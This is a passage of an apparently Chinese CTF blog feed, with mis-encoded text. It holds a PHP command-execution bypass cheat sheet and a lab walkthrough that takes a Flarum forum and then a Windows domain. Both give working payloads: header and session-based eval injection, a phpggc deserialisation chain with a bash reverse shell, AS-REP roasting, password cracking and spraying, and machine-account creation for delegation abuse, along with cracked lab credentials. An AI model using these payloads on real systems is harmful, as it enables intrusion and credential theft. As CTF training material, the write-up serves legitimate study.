çš„å€¼</td></tr><tr><td>scandir()</td><td>æ˜¾ç¤ºç›®å½•ä¸­çš„æ‰€æœ‰æ–‡ä»¶</td></tr><tr><td>scandir(current(localeconv()))</td><td>æŸ¥çœ‹ç›®å½•</td></tr><tr><td>var_dump(scandir(current(localeconv())))</td><td>è¾“å‡ºç›®å½•</td></tr><tr><td>array_flip()</td><td>äº¤æ¢æ•°ç»„ä¸­çš„é”®å’Œå€¼ï¼ŒæˆåŠŸæ—¶è¿”å›äº¤æ¢åçš„æ•°ç»„</td></tr><tr><td>array_rand()</td><td>ä»æ•°ç»„ä¸­éšæœºå–å‡ºä¸€ä¸ªæˆ–å¤šä¸ªå•å…ƒ</td></tr><tr><td>end()</td><td>å–å‡ºæ•°ç»„ä¸­çš„æœ€åä¸€ä½</td></tr><tr><td>chdir()</td><td>ç›®å½•è·³è½¬ï¼Œä¾‹å¦‚chdir(â€˜â€¦â€™)å°±æ˜¯è·³è½¬åˆ°ä¸Šçº§ç›®å½•</td></tr><tr><td>get_defined_vars()</td><td>è¿”å›ç”±æ‰€æœ‰å·²å®šä¹‰å˜é‡æ‰€ç»„æˆçš„æ•°ç»„ï¼ˆå…¨å±€å˜é‡ï¼‰</td></tr><tr><td>dirname()</td><td>è¿”å›å½“å‰æ–‡ä»¶çš„è·¯å¾„ï¼Œå°±æ˜¯pwd</td></tr><tr><td>getcwd()</td><td>è¿”å›å½“å‰çš„å·¥ä½œç›®å½•</td></tr><tr><td>getallheaders()</td><td>è¿”å›æ‰€æœ‰çš„è¯·æ±‚å¤´æ•°ç»„</td></tr><tr><td>getenv()</td><td>php7.1ç‰ˆæœ¬ä»¥åæ‰èƒ½ä½¿ç”¨ï¼Œè·å–ç¯å¢ƒå˜é‡</td></tr><tr><td>time()</td><td>è¿”å›å½“å‰çš„Unixæ—¶é—´æˆ³</td></tr><tr><td>localtime()</td><td>å–å¾—æœ¬åœ°æ—¶é—´</td></tr><tr><td>localtime(time())</td><td>è¿”å›ä¸€ä¸ªæ•°ç»„ï¼Œ0-60ä¹‹é—´</td></tr><tr><td>__halt_compiler();</td><td>åœæ­¢å¯¹å½“å‰è„šæœ¬çš„ç¼–è¯‘ï¼Œå¯ç”¨äºå»æ‰åè¾¹æ²¡ç”¨çš„å­—ç¬¦ä¸²</td></tr><tr><td>pos()</td><td>å–å‡ºæ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ </td></tr><tr><td>print_r(scandir(next(scandir(getcwd()))));</td><td>è¾“å‡ºä¸Šçº§ç›®å½•</td></tr><tr><td>print_r(highlight_file(array_rand(array_flip(scandir(current(localeconv()))))));</td><td>èµŒç‹—æ“ä½œï¼Œéšæœºè¯»å½“å‰ç›®å½•æ–‡ä»¶</td></tr></tbody></table><p><strong>æŸ¥çœ‹å½“å‰ç›®å½•æ–‡ä»¶</strong></p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">print_r</span>(<span class="title">scandir</span>(<span class="title">current</span>(<span class="title">localeconv</span>())));</span></span><br></pre></td></tr></table></figure><p><strong>è¯»å–å½“å‰ç›®å½•æ–‡ä»¶</strong></p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">show_source</span>(<span class="title">end</span>(<span class="title">scandir</span>(<span class="title">getcwd</span>())));</span></span><br><span class="line"><span class="function"><span class="title">show_source</span>(<span class="title">current</span>(<span class="title">array_reverse</span>(<span class="title">scandir</span>(<span class="title">getcwd</span>()))));</span></span><br></pre></td></tr></table></figure><p><strong>éšæœºè¿”å›å½“å‰ç›®å½•æ–‡ä»¶</strong></p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">highlight_file</span>(<span class="title">array_rand</span>(<span class="title">array_flip</span>(<span class="title">scandir</span>(<span class="title">getcwd</span>()))));</span></span><br><span class="line"><span class="function"><span class="title">show_source</span>(<span class="title">array_rand</span>(<span class="title">array_flip</span>(<span class="title">scandir</span>(<span class="title">getcwd</span>()))));</span></span><br><span class="line"><span class="function"><span class="title">show_source</span>(<span class="title">array_rand</span>(<span class="title">array_flip</span>(<span class="title">scandir</span>(<span class="title">current</span>(<span class="title">localeconv</span>())))));</span></span><br></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹ä¸Šçº§ç›®å½•</strong></p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">print_r</span>(<span class="title">scandir</span>(<span class="title">dirname</span>(<span class="title">getcwd</span>())));</span></span><br><span class="line"><span class="function"><span class="title">print_r</span>(<span class="title">scandir</span>(<span class="title">next</span>(<span class="title">scandir</span>(<span class="title">getcwd</span>()))));</span></span><br><span class="line"><span class="function"><span class="title">print_r</span>(<span class="title">scandir</span>(<span class="title">next</span>(<span class="title">scandir</span>(<span class="title">getcwd</span>()))));</span></span><br></pre></td></tr></table></figure><p><strong>è¯»å–ä¸Šçº§ç›®å½•æ–‡ä»¶</strong></p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">show_source</span>(<span class="title">array_rand</span>(<span class="title">array_flip</span>(<span class="title">scandir</span>(<span class="title">dirname</span>(<span class="title">chdir</span>(<span class="title">dirname</span>(<span class="title">getcwd</span>())))))));</span></span><br><span class="line"><span class="function"><span class="title">show_source</span>(<span class="title">array_rand</span>(<span class="title">array_flip</span>(<span class="title">scandir</span>(<span class="title">chr</span>(<span class="title"><span class="built_in">ord</span></span>(<span class="title">hebrevc</span>(<span class="title">crypt</span>(<span class="title">chdir</span>(<span class="title">next</span>(<span class="title">scandir</span>(<span class="title">getcwd</span>())))))))))));</span></span><br><span class="line"><span class="function"><span class="title">show_source</span>(<span class="title">array_rand</span>(<span class="title">array_flip</span>(<span class="title">scandir</span>(<span class="title">chr</span>(<span class="title"><span class="built_in">ord</span></span>(<span class="title">hebrevc</span>(<span class="title">crypt</span>(<span class="title">chdir</span>(<span class="title">next</span>(<span class="title">scandir</span>(<span class="title">chr</span>(<span class="title"><span class="built_in">ord</span></span>(<span class="title">hebrevc</span>(<span class="title">crypt</span>(<span class="title">phpversion</span>())))))))))))))));</span></span><br></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹æ ¹ç›®å½•æ–‡ä»¶å</strong></p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">print_r</span>(<span class="title">scandir</span>(<span class="title">chr</span>(<span class="title"><span class="built_in">ord</span></span>(<span class="title">strrev</span>(<span class="title">crypt</span>(<span class="title">serialize</span>(<span class="title">array</span>())))))));</span></span><br></pre></td></tr></table></figure><h5 id="session-id">session_id</h5><p>é€šè¿‡å¼€å¯sessionï¼Œæ„é€ æ¶æ„sessionå€¼è¿›è€Œæ‰§è¡Œä»»æ„æ¶æ„ä»£ç ï¼Œæ„é€ è„šæœ¬å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">bin2hex</span>(<span class="string">&quot;phpinfo();&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ¶æ„ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">session_id</span>(<span class="title function_ invoke__">session_start</span>())));</span><br></pre></td></tr></table></figure><p>æ¶æ„sessionå€¼</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">phpsessid</span><span class="operator">=</span><span class="number">706870696</span>e666f28293b</span><br></pre></td></tr></table></figure><h5 id="getallheaders">getallheaders</h5><p>ç¤ºä¾‹ä»£ç </p><p>æºä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// FLAG in the flag.php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>) &amp;&amp; !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/base|rot/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">    @<span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;nope&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>payload:</strong></p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">eval(<span class="built_in">array</span><span class="constructor">_pop(<span class="params">getallheaders</span>()</span>));</span><br><span class="line"><span class="comment">//è¿™é‡Œçš„array_popæ˜¯å¼¹å‡ºhttpå¤´çš„æœ€åä¸€ä¸ª</span></span><br><span class="line"><span class="comment">//getallheaders()ä¼šè·å–æ‰€æœ‰è¯·æ±‚å¤´ä¿¡æ¯çš„ä¸€ä¸ªæ•°ç»„</span></span><br></pre></td></tr></table></figure><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">è¯·æ±‚å¤´:</span><br><span class="line">å› ä¸ºå¾—æ˜¯åœ¨æœ€åä¸€ä¸ªï¼Œæ‰€ä»¥ç”¨å­—æ¯è®©ä»–æ’åˆ°æœ€å,ä¾‹å¦‚ï¼š</span><br><span class="line">ZZZZZ=phpinfo();</span><br><span class="line"></span><br><span class="line">æˆ–è€…ä½¿ç”¨</span><br><span class="line"><span class="keyword">eval</span>(<span class="keyword">pos</span>(<span class="keyword">next</span>(array_reverse(getallheaders())));</span><br></pre></td></tr></table></figure><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240123225738166.png" alt="image-20240123225738166"></p><p>æ³¨æ„çœ‹ï¼Œæ­¤æ—¶æˆ‘ä»¬é€šè¿‡printæˆåŠŸè¾“å‡ºäº†getallheadersçš„æ•°ç»„ï¼Œå¹¶æ„é€ äº†æ¶æ„è¯·æ±‚å¤´ZZZZZZï¼Œçœ‹å›¾å¯å¾—å…¶ä½äºæœ€åä¸€ä½</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240123225838387.png" alt="image-20240123225838387"></p><p>æ­¤æ—¶æˆ‘ä»¬å¯ä»¥é€šè¿‡endå‡½æ•°æˆåŠŸæå–åˆ°äº†æˆ‘ä»¬æ„é€ çš„ZZZZZçš„å€¼</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240123225922913.png" alt="image-20240123225922913"></p><p>å°†printæ¢æˆevalå³å¯å‘ç°æˆ‘ä»¬æˆåŠŸæ‰§è¡Œäº†phpinfo</p><h5 id="get-defined-vars">get_defined_vars</h5><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è·å–å…¨å±€å˜é‡$_POST   $_GET    $_FILE    $_COOKIE</span><br></pre></td></tr></table></figure><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240123225218898.png" alt="image-20240123225218898"></p><p>ç”±å›¾å¯å¾—ï¼Œæˆ‘ä»¬è·å–äº†æ‰€æœ‰çš„å…¨å±€å˜é‡</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240123225346696.png" alt="image-20240123225346696"></p><p>è§‚å¯Ÿè¿™å¼ å›¾ï¼Œæˆ‘åˆ©ç”¨äº†ä¸¤ä¸ªposæˆåŠŸæå–å‡ºäº†æˆ‘ä»¬æ¶æ„æ„é€ çš„123è¿™ä¸€å˜é‡</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240123225447536.png" alt="image-20240123225447536"></p><p>æ­¤æ—¶æˆ‘å°†printæ¢æˆäº†systemï¼Œå†å°†æ¶æ„æ„é€ çš„123æ¢æˆäº†ç³»ç»Ÿå‘½ä»¤lsï¼Œå‘åŒ…åå³å¯å‘ç°æˆ‘ä»¬æˆåŠŸæ‰§è¡Œäº†lsç³»ç»Ÿå‘½ä»¤</p><h4 id="ç»•è¿‡ç®€ä»‹">ç»•è¿‡ç®€ä»‹</h4><p>evalç±»å’Œsystemç±»å‘½ä»¤æ‰§è¡Œçš„ç»•è¿‡å¤§åŒå°å¼‚ï¼Œæ­¤å¤„é¢å¤–æä¾›ä¸¤ä¸ªä»…åœ¨evalç±»ç”Ÿæ•ˆçš„è„šæœ¬ï¼Œå…¶æœ¬è´¨ä¸ºphpçš„å­—ç¬¦è§£ææœºåˆ¶å’Œphpçš„å‡½æ•°åˆ©ç”¨ï¼Œä»¥ä¸‹å¯ç”¨äºç»•è¿‡ç‰¹æ®Šå­—ç¬¦æ®µçš„è¿‡æ»¤ï¼Œé€‚ç”¨äºshow_sourceç­‰å¤šç§2.2.2ä¸­çš„æ˜¾ç¤ºå’ŒåŒ…å«æ–‡ä»¶å‡½æ•°çš„å‚æ•°æ„é€ </p><p><strong>1.16è¿›åˆ¶ç»•è¿‡&quot;\x77\x61\x66\x2e\x70\x68\x70&quot;ï¼Œå¤–é¢å¿…é¡»ä¸ºåŒå¼•å·</strong></p><p>16è¿›åˆ¶çš„æ„é€ è„šæœ¬</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">original_string</span>=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="function"><span class="title">while</span>(<span class="variable">original_string</span><span class="variable">!</span>=<span class="string">&#x27;end&#x27;</span>):</span></span><br><span class="line"><span class="function">    <span class="variable">original_string</span> = <span class="title">input</span>()</span></span><br><span class="line">    <span class="variable">hex_representation</span> = <span class="string">&quot;\\x&quot;</span>.join(<span class="string">&quot;&#123;:02x&#125;&quot;</span>.format(<span class="function"><span class="title"><span class="built_in">ord</span></span>(<span class="variable">char</span>)) <span class="variable">for</span> <span class="variable">char</span> <span class="variable"><span class="keyword">in</span></span> <span class="variable">original_string</span>)</span></span><br><span class="line">    <span class="variable">final_result</span> = <span class="string">&quot;\\x&quot;</span> + <span class="variable">hex_representation</span></span><br><span class="line">    <span class="function"><span class="title">print</span>(<span class="variable">final_result</span>)</span></span><br></pre></td></tr></table></figure><p><strong>2.chrå‡½æ•°ç»•è¿‡chr(119).chr(97).chr(102).chr(46).chr(112).chr(104).chr(112)</strong></p><p>chrçš„æ„é€ è„šæœ¬</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">def convert_to_ascii_special(<span class="keyword">text</span>):</span><br><span class="line">    ascii_special = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> <span class="keyword">char</span> <span class="keyword">in</span> <span class="keyword">text</span>:</span><br><span class="line">        ascii_code = ord(<span class="keyword">char</span>)</span><br><span class="line">        ascii_special += <span class="string">&#x27;chr(&#123;&#125;).&#x27;</span>.<span class="built_in">format</span>(ascii_code)</span><br><span class="line">    ascii_special = ascii_special[:<span class="number">-1</span>]  <span class="comment"># å»é™¤æœ€åä¸€ä¸ªåŠ å·</span></span><br><span class="line">    <span class="literal">return</span> ascii_special</span><br><span class="line"></span><br><span class="line">user_input=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">while</span>(user_input!=<span class="string">&#x27;end&#x27;</span>):</span><br><span class="line">    user_input = input(<span class="string">&quot;è¯·è¾“å…¥è¦è½¬æ¢çš„å­—ç¬¦ï¼š&quot;</span>)</span><br><span class="line">    <span class="built_in">result</span> = convert_to_ascii_special(user_input)</span><br><span class="line">    print(<span class="built_in">result</span>)</span><br></pre></td></tr></table></figure><p><strong>3.å…«è¿›åˆ¶ç»•è¿‡</strong></p><p>å‚è€ƒé“¾æ¥ï¼š</p><p><a href="https://blog.csdn.net/qq_56815564/article/details/130279662">https://blog.csdn.net/qq_56815564/article/details/130279662</a></p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p><p><a href="https://blog.csdn.net/kali_Ma/article/details/122544274">https://blog.csdn.net/kali_Ma/article/details/122544274</a></p>]]></content>
    
    
    <summary type="html">æ•´ç†çš„ç¬”è®°</summary>
    
    
    
    <category term="CTF" scheme="https://bowuchuling.github.io/categories/CTF/"/>
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/categories/CTF/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="CTF" scheme="https://bowuchuling.github.io/tags/CTF/"/>
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>æ˜¥ç§‹äº‘å¢ƒ Flarum</title>
    <link href="https://bowuchuling.github.io/posts/chunqiu_Flarum.html"/>
    <id>https://bowuchuling.github.io/posts/chunqiu_Flarum.html</id>
    <published>2024-09-23T04:37:44.193Z</published>
    <updated>2024-09-23T04:38:26.408Z</updated>
    
    <content type="html"><![CDATA[<h1>Flarum</h1><h2 id="flag01">flag01</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">39.101.188.77:22 open</span><br><span class="line">39.101.188.77:80 open</span><br><span class="line">[*] alive ports len is: 2</span><br><span class="line">start vulscan</span><br><span class="line">[*] WebTitle http://39.101.188.77      code:200 len:5882   title:éœ„å£¤ç¤¾åŒº</span><br></pre></td></tr></table></figure><p>Flarumæ¡†æ¶çš„ä¸€ä¸ªç½‘ç«™ï¼Œå­˜åœ¨å¼±å£ä»¤</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">administrator</span>/<span class="number">1</span>chris</span><br></pre></td></tr></table></figure><p>è¿›å…¥åå°ç®¡ç†ï¼Œåœ¨å¤–è§‚ç•Œé¢è‡ªå®šä¹‰CSS</p><p>å‚è€ƒåšå®¢ï¼š<a href="https://mp.weixin.qq.com/s/EqEyEDKpzxS5BYA_t74p9A%E7%94%9F%E6%88%90payload">https://mp.weixin.qq.com/s/EqEyEDKpzxS5BYA_t74p9Aç”Ÿæˆpayload</a></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.<span class="regexp">/phpggc -p tar -b Monolog/</span>RCE6 system <span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#x27;&quot;</span></span><br></pre></td></tr></table></figure><p>å¡«å…¥å¦‚ä¸‹å†…å®¹</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@<span class="keyword">import</span> (<span class="keyword">inline</span>) <span class="string">&#x27;data:text/css;base64,payload&#x27;</span>;</span><br></pre></td></tr></table></figure><p>ä¿å­˜ä¹‹åå†æ¬¡ä¿®æ”¹CSS</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.test</span> &#123;</span><br><span class="line">    <span class="attribute">content</span>: <span class="built_in">data-uri</span>(<span class="string">&#x27;phar://./assets/forum.css&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¿å­˜åå³å¯è§¦å‘åå¼¹shellï¼Œææƒå‚è€ƒhttps://www.cnblogs.com/f-carey/p/16026088.html</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl enc -<span class="keyword">in</span> <span class="string">&quot;/root/flag/flag01.txt&quot;</span></span><br></pre></td></tr></table></figure><h2 id="flag02">flag02</h2><p>æ­å»ºä»£ç†ï¼Œæ‰«æå†…ç½‘</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">172.22.60.42:135 open</span><br><span class="line">172.22.60.8:88 open</span><br><span class="line">172.22.60.42:445 open</span><br><span class="line">172.22.60.8:445 open</span><br><span class="line">172.22.60.15:445 open</span><br><span class="line">172.22.60.42:139 open</span><br><span class="line">172.22.60.8:139 open</span><br><span class="line">172.22.60.15:139 open</span><br><span class="line">172.22.60.8:135 open</span><br><span class="line">172.22.60.15:135 open</span><br><span class="line">172.22.60.52:80 open</span><br><span class="line">172.22.60.52:22 open</span><br><span class="line">[*] alive ports len is: 12</span><br><span class="line">start vulscan</span><br><span class="line">[*] NetBios: 172.22.60.42    XIAORANG\FILESERVER            </span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]172.22.60.8</span><br><span class="line">   [-&gt;]DC</span><br><span class="line">   [-&gt;]172.22.60.8</span><br><span class="line">   [-&gt;]169.254.236.57</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]172.22.60.15</span><br><span class="line">   [-&gt;]PC1</span><br><span class="line">   [-&gt;]172.22.60.15</span><br><span class="line">   [-&gt;]169.254.192.250</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]172.22.60.42</span><br><span class="line">   [-&gt;]Fileserver</span><br><span class="line">   [-&gt;]172.22.60.42</span><br><span class="line">   [-&gt;]169.254.108.2</span><br><span class="line">[*] NetBios: 172.22.60.15    XIAORANG\PC1                   </span><br><span class="line">[*] NetBios: 172.22.60.8     [+]DC XIAORANG\DC              </span><br><span class="line">[*] WebTitle: http://172.22.60.52       code:200 len:5867   title:éœ„å£¤ç¤¾åŒº</span><br></pre></td></tr></table></figure><p>å…¥å£æœºä¸Šèšå‰‘è„±åº“ï¼Œå¯ä»¥å¾—åˆ°ä¸€æ¨åŸŸç”¨æˆ·ï¼Œè·‘ä¸€ä¸‹çœ‹çœ‹æœ‰æ²¡æœ‰è®¾ç½®ä¸éœ€è¦é¢„èº«ä»½è®¤è¯çš„</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 impacket-GetNPUsers -dc-ip <span class="number">172.22</span><span class="number">.60</span><span class="number">.8</span> -usersfile user.txt xiaorang.lab/ <span class="number">2</span>&gt;<span class="regexp">/dev/</span><span class="literal">null</span></span><br></pre></td></tr></table></figure><p>æ‹¿ç€å¾—åˆ°çš„å“ˆå¸Œçˆ†ä¸€ä¸‹</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -<span class="selector-tag">a</span> <span class="number">0</span> -m <span class="number">18200</span> <span class="attr">--force</span> hash<span class="selector-class">.txt</span> ./rockyou.txt</span><br></pre></td></tr></table></figure><p>ç»“æœå¦‚ä¸‹</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wangyun/Adm12geC</span><br></pre></td></tr></table></figure><p>å°è¯•çˆ†ç ´ä¸€ä¸‹rdp</p><figure class="highlight qml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 crackmapexec smb <span class="number">172.22</span><span class="number">.60</span><span class="number">.1</span>/<span class="number">24</span> -u wangyun -p Adm12geC --<span class="keyword">continue</span>-<span class="keyword">on</span>-success <span class="number">2</span>&gt;<span class="regexp">/dev/</span><span class="literal">null</span></span><br></pre></td></tr></table></figure><p>ç»“æœå¦‚ä¸‹</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">SMB</span>         <span class="number">172.22.60.15</span>    <span class="number">445</span>    PC1              [+] xiaorang.lab\wangyun:Adm12geC</span><br><span class="line">SMB         <span class="number">172.22.60.8</span>     <span class="number">445</span>    DC               [+] xiaorang.lab\wangyun:Adm12geC</span><br></pre></td></tr></table></figure><p>DCä¸ç”¨æƒ³äº†ï¼Œå¯ä»¥ç¡®å®šå°±æ˜¯é‚£ä¸ªPC1å¯ä»¥ç™»å½•ï¼Œrdpä¸Šå»ä¹‹åæ¡Œé¢æœ‰ä¸ªxshellï¼Œæ”¶é›†ä¸€ä¸‹å¯†ç </p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="module-access"><span class="module"><span class="identifier">SharpXDecrypt</span>.</span></span>exe</span><br></pre></td></tr></table></figure><p>å¯ä»¥å¾—åˆ°xshellçš„è´¦å·å¯†ç ï¼Œç»“æœå¦‚ä¸‹</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">UserName:</span> zhangxin</span><br><span class="line"><span class="symbol">Password:</span> admin4qwY38cc</span><br></pre></td></tr></table></figure><p>å…ˆæ”¶é›†ä¸€æ³¢åŸŸå†…ä¿¡æ¯</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240923122244244.png" alt="image-20240923122244244"></p><p>å¯ä»¥å‘ç°zhangxinæ˜¯å±äºAOç»„çš„ï¼Œå‚è€ƒæˆ‘çš„https://bowuchuling.github.io/posts/yushentouweipai.htmlï¼Œå¯ä»¥åˆ©ç”¨æ­¤ç»„æ‹¿ä¸‹FILESERVERè¿™å°æœºå™¨</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å¯¼å…¥æ¨¡å—</span></span><br><span class="line">Import-Module .\Powermad.ps1</span><br><span class="line"><span class="comment"># è®¾ç½®æœºå™¨è´¦æˆ·çš„å¯†ç </span></span><br><span class="line"><span class="variable">$Password</span> = ConvertTo-SecureString <span class="string">&#x27;whoami@666&#x27;</span> -AsPlainText -Force</span><br><span class="line"><span class="comment"># é€šè¿‡ New-MachineAccount å‡½æ•°åˆ›å»ºæœºå™¨è´¦æˆ·</span></span><br><span class="line">New-MachineAccount -MachineAccount <span class="string">&quot;hacker&quot;</span> -Password $(<span class="variable">$Password</span>) -Domain <span class="string">&quot;xiaorang.lab&quot;</span> -DomainController <span class="string">&quot;DC.xiaorang.lab&quot;</span> -Verbose</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹æ–°æœºå™¨è´¦æˆ·çš„sid</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Import</span><span class="operator">-</span><span class="built_in">Module</span> <span class="operator">.</span>\<span class="variable">PowerView</span><span class="operator">.</span><span class="variable">ps1</span><span class="operator">;</span><span class="built_in">Get</span><span class="operator">-</span><span class="variable">NetComputer</span> <span class="variable">hacker</span> <span class="operator">-</span><span class="built_in">Properties</span> <span class="variable">objectsid</span></span><br></pre></td></tr></table></figure><p>ç»“æœå¦‚ä¸‹</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">S</span>-<span class="number">1</span>-<span class="number">5</span>-<span 